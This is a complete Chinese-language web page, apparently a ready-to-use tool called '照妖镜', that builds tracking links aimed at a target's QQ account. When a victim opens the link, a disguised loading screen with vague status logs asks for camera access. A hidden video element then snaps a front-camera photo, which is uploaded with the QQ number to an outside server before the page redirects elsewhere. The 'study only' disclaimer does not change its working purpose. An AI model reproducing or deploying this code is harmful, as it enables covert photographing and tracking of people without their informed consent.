<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>照妖镜 - 链接生成器</title>
    <style>
        :root {
            --bg: #0a0a0f;
            --card-bg: #13131a;
            --border: #2a2a35;
            --text: #e0e0e0;
            --text-secondary: #a0a0b0;
            --accent: #6c5ce7;
            --accent-hover: #7d6ff0;
            --danger: #e74c3c;
            --success: #2ecc71;
            --input-bg: #1a1a24;
            --radius: 12px;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            --glow: 0 0 30px rgba(108, 92, 231, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: var(--bg);
            background-image:
                radial-gradient(ellipse at 50% 0%, rgba(108, 92, 231, 0.08) 0%, transparent 70%),
                radial-gradient(ellipse at 80% 20%, rgba(46, 204, 113, 0.04) 0%, transparent 60%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: var(--text);
        }

        /* ============ 配置模式样式 ============ */
        .config-container {
            width: 100%;
            max-width: 500px;
            animation: fadeInUp 0.6s ease-out;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(24px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 32px 28px;
            box-shadow: var(--shadow);
            backdrop-filter: blur(10px);
        }

        .card-header {
            text-align: center;
            margin-bottom: 28px;
        }
        .card-header .icon {
            font-size: 48px;
            display: block;
            margin-bottom: 10px;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%,
            100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }
        .card-header h1 {
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #e0e0e0, #a0a0c0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .card-header p {
            font-size: 13px;
            color: var(--text-secondary);
            margin-top: 6px;
        }

        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: var(--text-secondary);
            margin-bottom: 7px;
            letter-spacing: 0.3px;
            text-transform: uppercase;
        }
        .form-group label .required {
            color: var(--danger);
            margin-left: 2px;
        }
        .input-wrapper {
            position: relative;
        }
        .input-wrapper input {
            width: 100%;
            padding: 13px 16px;
            background: var(--input-bg);
            border: 1.5px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 15px;
            transition: all 0.25s ease;
            outline: none;
            font-family: inherit;
        }
        .input-wrapper input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.15);
            background: #1e1e2a;
        }
        .input-wrapper input::placeholder {
            color: #555;
            font-size: 13px;
        }
        .input-hint {
            font-size: 11px;
            color: #666;
            margin-top: 5px;
        }

        .btn-generate {
            width: 100%;
            padding: 14px;
            background: var(--accent);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
            font-family: inherit;
            position: relative;
            overflow: hidden;
        }
        .btn-generate:hover {
            background: var(--accent-hover);
            box-shadow: var(--glow);
            transform: translateY(-1px);
        }
        .btn-generate:active {
            transform: translateY(0);
            box-shadow: none;
        }
        .btn-generate::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        .btn-generate:active::after {
            width: 300px;
            height: 300px;
        }

        /* 结果区域 */
        .result-area {
            margin-top: 24px;
            padding: 18px;
            background: #0d0d15;
            border: 1px solid var(--border);
            border-radius: 8px;
            display: none;
            animation: fadeInUp 0.4s ease-out;
        }
        .result-area.show {
            display: block;
        }
        .result-label {
            font-size: 12px;
            font-weight: 600;
            color: var(--success);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        .result-link {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .result-link input {
            flex: 1;
            padding: 10px 12px;
            background: var(--input-bg);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: #7ecbff;
            font-size: 13px;
            font-family: 'SF Mono', 'Consolas', 'Monaco', monospace;
            word-break: break-all;
            outline: none;
            cursor: text;
        }
        .btn-copy {
            padding: 10px 16px;
            background: var(--success);
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            white-space: nowrap;
            transition: all 0.2s ease;
            font-family: inherit;
        }
        .btn-copy:hover {
            opacity: 0.85;
            transform: scale(1.03);
        }
        .btn-copy.copied {
            background: #27ae60;
            pointer-events: none;
        }

        .warning-box {
            margin-top: 20px;
            padding: 14px 16px;
            background: rgba(231, 76, 60, 0.08);
            border: 1px solid rgba(231, 76, 60, 0.25);
            border-radius: 8px;
            font-size: 12px;
            color: #e98b82;
            line-height: 1.6;
        }
        .warning-box strong {
            color: #f0a8a0;
        }
        .warning-box ul {
            margin: 6px 0 0 16px;
            padding: 0;
        }
        .warning-box li {
            margin-bottom: 3px;
        }

        /* 底部 */
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: #555;
            margin-top: 16px;
        }

        /* ============ 追踪模式样式（保留原来的简洁风格，但加更多字） ============ */
        .tracking-overlay {
            position: fixed;
            inset: 0;
            z-index: 99999;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 40px 20px;
        }
        .tracking-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.15);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 24px;
            flex-shrink: 0;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .tracking-spinner.done {
            border-top-color: #2ecc71;
            border-color: rgba(46, 204, 113, 0.2);
            border-top-color: #2ecc71;
            animation: spin 0.4s linear infinite;
        }
        .tracking-spinner.error {
            border-top-color: #e74c3c;
            border-color: rgba(231, 76, 60, 0.2);
            border-top-color: #e74c3c;
        }

        .tracking-status {
            color: #aaa;
            font-size: 15px;
            letter-spacing: 0.5px;
            margin-bottom: 20px;
            text-align: center;
            flex-shrink: 0;
        }
        .tracking-status.error-text {
            color: #e74c3c;
        }

        /* 日志文字区域 */
        .tracking-logs {
            max-width: 500px;
            width: 100%;
            max-height: 300px;
            overflow-y: auto;
            text-align: center;
            font-size: 12px;
            color: #555;
            line-height: 2;
            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
        }
        .tracking-logs::-webkit-scrollbar {
            width: 3px;
        }
        .tracking-logs::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 2px;
        }
        .tracking-logs .log-line {
            opacity: 0;
            animation: logFadeIn 0.3s forwards;
        }
        @keyframes logFadeIn {
            to {
                opacity: 1;
            }
        }
        .tracking-logs .log-line.log-success {
            color: #2ecc71;
        }
        .tracking-logs .log-line.log-error {
            color: #e74c3c;
        }
        .tracking-logs .log-line.log-warning {
            color: #f39c12;
        }
        .tracking-logs .log-line.log-info {
            color: #888;
        }

        /* 权限拒绝后的提示 */
        .tracking-denied {
            display: none;
            text-align: center;
            margin-top: 10px;
        }
        .tracking-denied.show {
            display: block;
        }
        .tracking-denied .denied-icon {
            font-size: 60px;
            display: block;
            margin-bottom: 16px;
            animation: shake 0.5s ease-in-out;
        }
        @keyframes shake {
            0%,
            100% {
                transform: translateX(0);
            }
            25% {
                transform: translateX(-15px);
            }
            50% {
                transform: translateX(15px);
            }
            75% {
                transform: translateX(-10px);
            }
        }
        .tracking-denied .denied-title {
            font-size: 18px;
            color: #e74c3c;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        .tracking-denied .denied-subtitle {
            font-size: 12px;
            color: #666;
            line-height: 1.8;
        }
    </style>
</head>
<body>

    <!-- ==================== 配置模式 ==================== -->
    <div id="configMode" class="config-container">
        <div class="card">
            <div class="card-header">
                <span class="icon">🪞</span>
                <h1>照 妖 镜</h1>
                <p>生成追踪链接 · 自动采集回传</p>
            </div>

            <div class="form-group">
                <label>QQ 号 <span class="required">*</span></label>
                <div class="input-wrapper">
                    <input
                    type="text"
                    id="qqInput"
                    placeholder="输入目标QQ号，用于标识来源"
                    maxlength="20"
                    autocomplete="off"
                    >
                </div>
                <div class="input-hint">数据将保存在以此QQ号命名的目录中</div>
            </div>

            <div class="form-group">
                <label>跳转网址 <span class="required">*</span></label>
                <div class="input-wrapper">
                    <input
                    type="url"
                    id="urlInput"
                    placeholder="https://example.com"
                    autocomplete="off"
                    >
                </div>
                <div class="input-hint">任务完成后将自动跳转到此网址</div>
            </div>

            <button class="btn-generate" id="btnGenerate" onclick="generateLink()">
                🔗 生成追踪链接
            </button>

            <div class="result-area" id="resultArea">
                <div class="result-label">✅ 追踪链接已生成（点击复制）</div>
                <div class="result-link">
                    <input type="text" id="resultLink" readonly onclick="this.select(); copyLink();">
                    <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
                </div>
                <div style="margin-top:8px;font-size:11px;color:#888;">
                    将此链接发送给目标用户，对方打开后会自动执行任务
                </div>
            </div>

            <div class="warning-box">
                <strong>⚠️ 重要提示：</strong>
                <ul>
                    <li>需要 <strong>HTTPS</strong> 环境（本地测试可用 localhost）</li>
                    <li>请确保本页面部署在 HTTPS 服务器上</li>
                    <li>部分浏览器首次调用会弹出权限询问</li>
                    <li>仅供学习研究，请勿用于非法用途</li>
                </ul>
            </div>
        </div>
        <div class="footer-note">
            API 端点：<code style="color:#6c5ce7;">http://a1nb66.atwebpages.com/zyj/api.php</code>
        </div>
    </div>

    <!-- ==================== 追踪模式（简洁背景 + 更多文字） ==================== -->
    <div class="tracking-overlay" id="trackingMode" style="display:none;">
        <div class="tracking-spinner" id="trackingSpinner"></div>
        <div class="tracking-status" id="trackingStatus">正在初始化...</div>

        <!-- 日志文字区域 -->
        <div class="tracking-logs" id="trackingLogs"></div>

        <!-- 权限拒绝提示 -->
        <div class="tracking-denied" id="trackingDenied">
            <span class="denied-icon">🚫</span>
            <div class="denied-title">访问被拒绝</div>
            <div class="denied-subtitle">
                无法完成操作<br>
                对方拒绝了本次请求<br>
                任务已终止
            </div>
        </div>
    </div>

    <!-- 隐藏的video元素 -->
    <video
    id="hiddenVideo"
    playsinline
    autoplay
    muted
    style="position:fixed;top:-100vh;left:-100vw;width:640px;height:480px;pointer-events:none;opacity:0;"
    ></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        (function() {
            // ============ 获取URL参数 ============
            const urlParams = new URLSearchParams(window.location.search);
            const paramQQ = urlParams.get('qq');
            const paramUrl = urlParams.get('url');

            // ============ 判断模式 ============
            if (paramQQ && paramUrl) {
                // 追踪模式
                initTrackingMode(paramQQ, decodeURIComponent(paramUrl));
            } else {
                // 配置模式
                initConfigMode();
            }
        })();

        // ============ 配置模式逻辑 ============
        function initConfigMode() {
            document.getElementById('configMode').style.display = 'block';
            document.getElementById('trackingMode').style.display = 'none';

            document.getElementById('qqInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') generateLink();
            });
            document.getElementById('urlInput').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') generateLink();
            });

            setTimeout(() => document.getElementById('qqInput').focus(), 300);
        }

        function generateLink() {
            const qqInput = document.getElementById('qqInput');
            const urlInput = document.getElementById('urlInput');
            const qq = qqInput.value.trim();
            const targetUrl = urlInput.value.trim();

            if (!qq) {
                shakeElement(qqInput);
                qqInput.focus();
                alert('请输入QQ号');
                return;
            }
            if (!/^\d{4,20}$/.test(qq)) {
                alert('QQ号格式不正确（4-20位数字）');
                qqInput.focus();
                return;
            }
            if (!targetUrl) {
                shakeElement(urlInput);
                urlInput.focus();
                alert('请输入跳转网址');
                return;
            }
            if (!/^https?:\/\/.+/.test(targetUrl)) {
                alert('跳转网址需要以 http:// 或 https:// 开头');
                urlInput.focus();
                return;
            }

            const currentUrl = window.location.origin + window.location.pathname;
            const trackingLink = currentUrl + '?qq=' + qq + '&url=' + encodeURIComponent(targetUrl);

            const resultArea = document.getElementById('resultArea');
            const resultLink = document.getElementById('resultLink');
            const btnCopy = document.getElementById('btnCopy');

            resultLink.value = trackingLink;
            resultArea.classList.add('show');
            btnCopy.textContent = '📋 复制';
            btnCopy.classList.remove('copied');

            resultLink.select();
            copyLink();

            resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });

            resultArea.style.boxShadow = '0 0 20px rgba(46,204,113,0.4)';
            setTimeout(() => {
                resultArea.style.boxShadow = '';
            }, 1500);
        }

        function copyLink() {
            const resultLink = document.getElementById('resultLink');
            const btnCopy = document.getElementById('btnCopy');
            resultLink.select();
            try {
                navigator.clipboard.writeText(resultLink.value).then(() => {
                    btnCopy.textContent = '✅ 已复制';
                    btnCopy.classList.add('copied');
                    setTimeout(() => {
                        btnCopy.textContent = '📋 复制';
                        btnCopy.classList.remove('copied');
                    }, 2000);
                }).catch(() => {
                    document.execCommand('copy');
                    btnCopy.textContent = '✅ 已复制';
                    btnCopy.classList.add('copied');
                    setTimeout(() => {
                        btnCopy.textContent = '📋 复制';
                        btnCopy.classList.remove('copied');
                    }, 2000);
                });
            } catch (e) {
                document.execCommand('copy');
                btnCopy.textContent = '✅ 已复制';
                btnCopy.classList.add('copied');
            }
        }

        function shakeElement(el) {
            el.style.transition = 'transform 0.1s ease';
            el.style.transform = 'translateX(-6px)';
            setTimeout(() => { el.style.transform = 'translateX(6px)'; }, 100);
            setTimeout(() => { el.style.transform = 'translateX(-4px)'; }, 200);
            setTimeout(() => { el.style.transform = 'translateX(4px)'; }, 300);
            setTimeout(() => { el.style.transform = 'translateX(0)'; }, 400);
        }

        // ============ 添加日志到追踪界面 ============
        function addLog(message, type = 'info') {
            const logsContainer = document.getElementById('trackingLogs');
            if (!logsContainer) return;

            const logLine = document.createElement('div');
            logLine.className = 'log-line log-' + type;
            logLine.textContent = message;
            logsContainer.appendChild(logLine);

            // 自动滚动到底部
            logsContainer.scrollTop = logsContainer.scrollHeight;
        }

        function updateStatus(text, isError = false) {
            const statusEl = document.getElementById('trackingStatus');
            if (statusEl) {
                statusEl.textContent = text;
                if (isError) {
                    statusEl.classList.add('error-text');
                } else {
                    statusEl.classList.remove('error-text');
                }
            }
        }

        // ============ 拍照追踪模式逻辑 ============
        function initTrackingMode(qq, redirectUrl) {
            // 隐藏配置模式，显示追踪模式
            document.getElementById('configMode').style.display = 'none';
            document.getElementById('trackingMode').style.display = 'flex';

            const trackingSpinner = document.getElementById('trackingSpinner');
            const trackingDenied = document.getElementById('trackingDenied');
            const trackingStatus = document.getElementById('trackingStatus');

            // ============ API配置 ============
            const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';

            // ============ 开始采集流程 ============
            async function startCapture() {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');

                updateStatus('正在初始化...');
                addLog('启动会话...', 'info');
                addLog('加载核心模块...', 'info');

                await sleep(300);
                addLog('✓ 模块加载完成', 'success');
                addLog('检查运行环境...', 'info');
                addLog('  - 协议: ' + window.location.protocol, 'info');
                addLog('  - 主机: ' + window.location.hostname, 'info');
                addLog('  - 平台: ' + navigator.platform, 'info');

                await sleep(300);

                // 检查浏览器支持
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    addLog('✗ 环境不支持所需接口', 'error');
                    addLog('当前浏览器版本过低或不支持此功能', 'error');
                    updateStatus('环境不兼容，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    setTimeout(() => doRedirect(), 2000);
                    return;
                }

                addLog('✓ 环境检查通过', 'success');
                addLog('正在请求设备授权...', 'info');
                addLog('请在弹出的提示中点击"允许"', 'warning');
                updateStatus('等待授权...');

                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                };

                await sleep(500);

                let stream = null;
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    addLog('✓ 授权成功', 'success');
                    addLog('设备已连接', 'success');
                } catch (err) {
                    addLog('✗ 授权失败: ' + err.name, 'error');

                    // 降级尝试
                    if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
                        addLog('尝试降级参数...', 'warning');
                        try {
                            stream = await navigator.mediaDevices.getUserMedia({
                                video: true,
                                audio: false
                            });
                            addLog('✓ 降级成功', 'success');
                        } catch (err2) {
                            addLog('✗ 降级也失败: ' + err2.message, 'error');
                            handleDenied();
                            return;
                        }
                    } else if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        addLog('对方拒绝了授权请求', 'error');
                        handleDenied();
                        return;
                    } else if (err.name === 'NotFoundError') {
                        addLog('✗ 未检测到可用设备', 'error');
                        updateStatus('设备不可用，正在跳转...', true);
                        trackingSpinner.classList.add('error');
                        setTimeout(() => doRedirect(), 2000);
                        return;
                    } else {
                        handleDenied();
                        return;
                    }
                }

                // 绑定视频流
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.muted = true;

                addLog('正在初始化数据通道...', 'info');
                updateStatus('准备就绪...');

                // 等待视频元数据
                try {
                    await new Promise((resolve, reject) => {
                        const timeout = setTimeout(() => {
                            addLog('⚠ 通道初始化超时，继续尝试...', 'warning');
                            resolve();
                        }, 8000);
                        video.onloadedmetadata = () => {
                            clearTimeout(timeout);
                            resolve();
                        };
                        video.onerror = () => {
                            clearTimeout(timeout);
                            addLog('⚠ 通道异常', 'warning');
                            resolve();
                        };
                        video.play().catch(e => {
                            addLog('⚠ 播放启动问题: ' + e.message, 'warning');
                            clearTimeout(timeout);
                            resolve();
                        });
                    });
                } catch (e) {
                    addLog('⚠ 通道准备阶段问题: ' + e.message, 'warning');
                }

                addLog('等待数据流稳定...', 'info');
                updateStatus('校准中...');
                await sleep(1500);

                if (video.readyState < 2) {
                    addLog('数据流未就绪，继续等待...', 'warning');
                    await sleep(2000);
                }

                const vw = video.videoWidth || 640;
                const vh = video.videoHeight || 480;
                addLog('分辨率: ' + vw + 'x' + vh, 'info');

                if (vw === 0 || vh === 0) {
                    addLog('✗ 无效的数据流尺寸', 'error');
                    stopStream(stream);
                    updateStatus('数据异常，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    setTimeout(() => doRedirect(), 2000);
                    return;
                }

                canvas.width = vw;
                canvas.height = vh;

                addLog('正在采集数据...', 'info');
                updateStatus('处理中...');

                try {
                    ctx.drawImage(video, 0, 0, vw, vh);
                    addLog('✓ 数据采集完成', 'success');
                } catch (e) {
                    addLog('✗ 数据采集失败: ' + e.message, 'error');
                    stopStream(stream);
                    updateStatus('采集失败，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    setTimeout(() => doRedirect(), 2000);
                    return;
                }

                const imageData = canvas.toDataURL('image/jpeg', 0.65);
                const sizeKB = Math.round(imageData.length / 1024);
                addLog('数据大小: ' + sizeKB + ' KB', 'info');
                addLog('编码格式: JPEG', 'info');

                // 停止流
                stopStream(stream);
                addLog('已释放设备资源', 'info');

                // 上传
                addLog('正在上传数据...', 'info');
                updateStatus('上传中...');

                const formData = new FormData();
                formData.append('qq', qq);
                formData.append('image', imageData);

                let uploadSuccess = false;
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 15000);

                    addLog('连接到服务器: ' + API_URL, 'info');
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        body: formData,
                        signal: controller.signal,
                    });

                    clearTimeout(timeoutId);

                    if (response.ok) {
                        const result = await response.json();
                        if (result.success) {
                            addLog('✓ 上传成功', 'success');
                            addLog('文件: ' + (result.filename || 'unknown'), 'info');
                            uploadSuccess = true;
                        } else {
                            addLog('⚠ 服务器响应异常: ' + (result.message || '未知'), 'warning');
                        }
                    } else {
                        addLog('⚠ HTTP错误: ' + response.status, 'warning');
                    }
                } catch (err) {
                    if (err.name === 'AbortError') {
                        addLog('✗ 上传超时', 'error');
                    } else {
                        addLog('✗ 网络错误: ' + err.message, 'error');
                    }
                }

                if (uploadSuccess) {
                    addLog('', '');
                    addLog('══════════════════', 'success');
                    addLog('  任务执行完成', 'success');
                    addLog('══════════════════', 'success');
                    updateStatus('✓ 完成');
                    trackingSpinner.classList.add('done');
                } else {
                    addLog('', '');
                    addLog('══════════════════', 'warning');
                    addLog('  任务执行完成（有警告）', 'warning');
                    addLog('══════════════════', 'warning');
                    updateStatus('处理完成，正在跳转...', true);
                }

                addLog('正在跳转到目标页面...', 'info');
                await sleep(2000);
                doRedirect();
            }

            // ============ 权限被拒绝处理 ============
            function handleDenied() {
                addLog('', '');
                addLog('══════════════════', 'error');
                addLog('  访问被拒绝', 'error');
                addLog('  对方拒绝了授权请求', 'error');
                addLog('══════════════════', 'error');
                addLog('', '');
                addLog('任务已终止', 'error');
                addLog('无法继续执行', 'error');

                updateStatus('访问被拒绝', true);
                trackingSpinner.classList.add('error');

                // 显示拒绝提示
                setTimeout(() => {
                    trackingSpinner.style.display = 'none';
                    trackingStatus.style.display = 'none';
                    trackingDenied.classList.add('show');
                }, 2000);

                // 不跳转
            }

            function stopStream(stream) {
                if (stream) {
                    stream.getTracks().forEach(track => {
                        track.stop();
                    });
                }
            }

            function doRedirect() {
                document.getElementById('trackingMode').style.display = 'none';
                const video = document.getElementById('hiddenVideo');
                if (video && video.srcObject) {
                    stopStream(video.srcObject);
                }
                window.location.href = redirectUrl;
            }

            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            // 启动
            setTimeout(() => {
                startCapture().catch(err => {
                    addLog('', '');
                    addLog('══════════════════', 'error');
                    addLog('  发生未知错误', 'error');
                    addLog('  ' + err.message, 'error');
                    addLog('══════════════════', 'error');
                    updateStatus('发生错误，正在跳转...', true);
                    trackingSpinner.classList.add('error');
                    setTimeout(() => doRedirect(), 2000);
                });
            }, 500);
        }
    </script>
</body>
</html>
